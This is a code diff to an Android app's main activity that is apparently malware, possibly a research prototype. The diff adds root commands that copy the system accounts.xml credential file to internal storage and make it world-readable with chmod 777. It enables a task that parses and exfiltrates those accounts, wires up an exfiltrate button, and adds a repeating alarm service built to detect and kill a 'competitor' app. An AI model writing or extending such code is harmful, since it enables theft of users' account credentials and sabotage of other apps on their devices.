@@ -1,7 +1,9 @@
 package com.trustme.testsu;
 
+import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
+import java.util.Calendar;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.List;
@@ -22,6 +24,8 @@ import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.app.Activity;
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
@@ -38,6 +42,8 @@ public class MainActivity extends Activity {
 	public static final int STOP_IP_CHECK = 2;
 	public static Context ctx;
 	private SQLiteDatabase database;
+	private AlarmManager alarm;
+	private PendingIntent pintent;
 	
 	private ContactsDataSource datasource;
 	protected Button btn_exfiltrate, btn_check_ip, btn_stop_check_ip;
@@ -79,8 +85,12 @@ public class MainActivity extends Activity {
 		//getUserLocation();
         //getInstalledApplications();
         //getContacts();
-        //getCompetitorsPid();
-        getUserAccounts();
+		
+		//TODO: Create a service that checks if competitor is running
+        //getCompetitorsPid(); 
+        
+        //getUserAccounts();
+		killCompetitor();
 	}
 
 	@Override
@@ -99,13 +109,17 @@ public class MainActivity extends Activity {
 	
 	private void getUserAccounts() {
 		//move accounts.xml to a convenient location and make it accessible
+		String[] commands = new String[2];
+		commands[0] = new String("cp " + Constants.ACCOUNTS_FILEPATH + " " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
+		commands[1] = new String("chmod 777 " + Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME + "\n");
+		
 		Root rt =new Root();
-	    rt.getSecretFile("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
+	    rt.getSecretFile(commands);
 	   // rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
 	    
 	    //parse accounts.xml and exfiltrate
-	    //ParseAccountsTask parse_accounts_task = new ParseAccountsTask();
-	    //parse_accounts_task.execute();
+	    ParseAccountsTask parse_accounts_task = new ParseAccountsTask();
+	    parse_accounts_task.execute();
 	}	
 	
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
@@ -123,6 +137,28 @@ public class MainActivity extends Activity {
 //		 String[] commands = {"kill" + pid};
 //		 rt.RunAsRoot(commands);
 	}
+	 
+	 /**
+	  * Set alarm for starting a service that checks if a competitor's app is running
+	  *  If it does it kills it
+	  * @author sdemetr2
+	  */
+	 private void killCompetitor() {
+			// TODO Auto-generated method stub
+		 Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
+		 pintent = PendingIntent.getService(getApplicationContext(), 0, intent, 0);
+		 alarm = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
+		 alarm.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), Constants.KILL_COMPETITOR_INTERVAL, pintent);
+	 }
+	 
+	 /**
+	  * stop killing competitor
+	  * @author sdemetr2
+	  */
+	 private void stopkillingCompetitor() {
+			// TODO Auto-generated method stub
+		 alarm.cancel(pintent);
+	 }
 	 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	
@@ -186,12 +222,14 @@ public class MainActivity extends Activity {
 			public void onClick(View v) {
 				// TODO Auto-generated method stub
 				start_checking_for_ip();
+				start_checking_for_competitor();
 			}
 
 		});
 	}
-    
-    private void prepareButtonStopCheckIp() {
+
+
+	private void prepareButtonStopCheckIp() {
 		// TODO Auto-generated method stub
     	btn_stop_check_ip = (Button) findViewById(R.id.stop_ip_checking);
     	
@@ -200,6 +238,7 @@ public class MainActivity extends Activity {
 			public void onClick(View v) {
 				// TODO Auto-generated method stub
 				stop_checking_for_ip();
+				stop_checking_for_competitor();
 			}
 
 		});
@@ -213,10 +252,7 @@ public class MainActivity extends Activity {
 			
 			public void onClick(View v) {
 				// TODO Auto-generated method stub
-				//exfiltrate(null,Constants.TEST_TRANSACTION);
-				//test
-				Root rt = new Root();
-				rt.changeMode("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
+				exfiltrate(null,Constants.TEST_TRANSACTION);
 			}
 
 		});
@@ -250,6 +286,21 @@ public class MainActivity extends Activity {
 		intent.putExtra("CMD", STOP_IP_CHECK);
 		stopService(intent);
 	}
+	
+//////////////////////////////////////////////////////////////////////////////////////////////////////////////	
+	
+	 protected void start_checking_for_competitor() {
+			// TODO Auto-generated method stub
+		 Log.i(TAG, "start service AreYouRunning");
+			Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
+			startService(intent);
+		}
+	 
+	 protected void stop_checking_for_competitor() {
+			// TODO Auto-generated method stub
+		 Intent intent = new Intent(getApplicationContext(), AreYouRunningService.class);
+			stopService(intent);
+		}
 	
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////
 	
@@ -366,6 +417,8 @@ public class MainActivity extends Activity {
 		
 		private void parseAccounts() {
 			// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker
+//			Root rt =new Root();
+//		    rt.getSecretFile("/data/system/sync/", "accounts.xml", Constants.NEW_ACCOUNTS_NAME);
 			
 			//String type = new String();
 			String authority = new String();
@@ -426,17 +479,19 @@ public class MainActivity extends Activity {
 					}
 					 
 				};
-					 
-			saxParser.parse(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME, handler);
+			saxParser.parse(new File(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME), handler);
+			//saxParser.parse(Constants.INTERNAL_STORAGE_PATH + Constants.NEW_ACCOUNTS_NAME, handler);
 				
 			} catch (ParserConfigurationException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
+				Log.i(TAG, "ParserConfigurationException :" + e.getMessage());
 			} catch (SAXException e) {
 				// TODO Auto-generated catch block
 				e.printStackTrace();
+				Log.i(TAG, "SAXException :" + e.getMessage());
 			} catch (IOException e) {
-				// TODO Auto-generated catch block
+				// TODO Could not open file - handle that
 				e.printStackTrace();
 			}
 			
